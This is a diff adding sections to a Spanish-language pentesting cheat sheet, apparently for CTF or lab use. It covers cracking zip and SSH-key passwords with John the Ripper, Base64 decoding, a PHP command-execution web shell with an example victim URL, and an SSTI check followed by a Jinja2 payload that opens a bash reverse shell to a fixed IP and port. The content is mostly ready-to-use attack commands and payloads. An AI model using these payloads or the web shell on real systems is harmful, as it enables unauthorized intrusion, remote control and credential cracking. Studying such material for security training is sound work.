@@ -127,5 +127,105 @@ export SHELL=/bin/sh
 source /etc/skel/.bashrc
 ```
 
+---
 
+## 🔐 Extraer Contraseña de un Archivo `.zip`
+
+1. Extraer el hash del archivo `.zip`:
+```
+zip2john archivo.zip > hash.txt
+```
+
+2. Crackear el hash con John the Ripper:
+```
+john hash.txt --wordlist=/ruta/al/diccionario.txt
+```
+
+3. Ver la contraseña encontrada:
+```
+john --show hash.txt
+```
+
+---
+
+## 🧬 Decodificar Base64
+
+Para decodificar una cadena codificada en Base64:
+
+```
+echo "cGFzc3dvcmQ=" | base64 -d
+```
+
+> Esto mostrará la cadena original ("password" en este ejemplo).
+
+---
+
+## 🐘 Ejecución Remota de Comandos en PHP
+
+Si una aplicación web permite pasar comandos a través de la URL (por ejemplo, usando `?cmd=`), puede estar expuesta a ejecución remota de comandos.
+
+Un ejemplo común de código vulnerable en PHP es:
+
+```
+<?php
+system($_GET['cmd']);
+?>
+```
+
+Este fragmento permite que cualquier usuario ejecute comandos en el sistema operativo desde el navegador, simplemente añadiendo el parámetro `cmd` en la URL. Por ejemplo:
+
+```
+http://victima.com/shell.php?cmd=whoami
+```
+
+> ⚠️ Este tipo de código representa una **grave vulnerabilidad** de ejecución remota (RCE).
+
+---
+
+## 🧠 SSTI (Server-Side Template Injection)
+
+1. Comprobar si es vulnerable:
+```
+{{7*7}}
+```
+
+Si la salida es `49`, es vulnerable a SSTI (por ejemplo, en motores Jinja2).
+
+2. Ejecutar reverse shell si es vulnerable:
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/3344 0>&1\'').read() }}
+```
+
+> Se abusa del acceso interno a objetos del entorno para importar `os` y lanzar una shell remota.
+
+---
+
+## 🔑 Crackear Passphrase de Clave SSH Privada (`id_rsa`)
+
+Cuando tienes una clave SSH protegida con passphrase:
+
+1. Extraer el hash:
+```
+ssh2john id_rsa > hash.txt
+```
+
+2. Crackear el hash:
+```
+john hash.txt --wordlist=/ruta/diccionario.txt
+```
+
+3. Ver la passphrase obtenida:
+```
+john --show hash.txt
+```
+
+---
+
+## ⚔️ Usar un Exploit Público
+
+Para ver cómo utilizar un exploit en Python (parámetros disponibles, etc.):
+
+```
+python3 /ruta/exploit.py -h
+```
 
